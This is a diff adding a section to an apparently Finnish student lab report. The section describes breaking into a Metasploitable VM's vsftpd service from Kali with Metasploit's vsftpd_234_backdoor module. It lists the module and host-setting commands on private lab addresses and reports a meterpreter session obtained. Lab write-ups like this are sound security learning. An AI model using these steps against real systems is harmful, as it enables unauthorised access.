@@ -40,6 +40,15 @@ Yksi tunnettu hyökkäys on portissa 21 oleva vsftpd. Se löytyi komennolla `sea
 Tästä saadaan helpommin suoraan ihmisen luettavaa, kun db_nmap tallentaa tiedot tietokantaan, mistä muut moduulit voivat lukea ne.  
 
 ## f) Murtaudu Metasploitablen vsftpd-palveluun  
+Ajoin ensiksi komennon `use exploit/unix/ftp/vsftpd_234_backdoor`, joka lataa hyökkäyksen käyttöön.  
+<img width="596" height="62" alt="image" src="https://github.com/user-attachments/assets/85db9117-5ffd-49fe-8eb0-6dc013620325" />  
+Komennolla `setg RHOSTS 192.168.56.11` asetin Metasploitablen remote host koneeksi, josta hyökkäys lähtee. Komennolla `set LHOST 192.168.56.10` asetin Kalin local host koneeksi. Komennolla `show options` näkyi lisätietoa, mitä exploit vaatii, ja että hostit ovat oikein.  
+<img width="1138" height="84" alt="image" src="https://github.com/user-attachments/assets/8e5faf90-7a10-431a-a503-dc2d1cac39d4" />  
+<img width="787" height="39" alt="image" src="https://github.com/user-attachments/assets/abcbed52-4421-4185-b8ca-ce660184bbaf" />  
+Ajoin komennon `exploit` ja pääsin sisälle meterpreter sessioon.  
+<img width="936" height="155" alt="image" src="https://github.com/user-attachments/assets/8fa954c0-e2f9-4460-8961-c0109686a3a3" />  
+
+
 
 
 ## Lähteet  
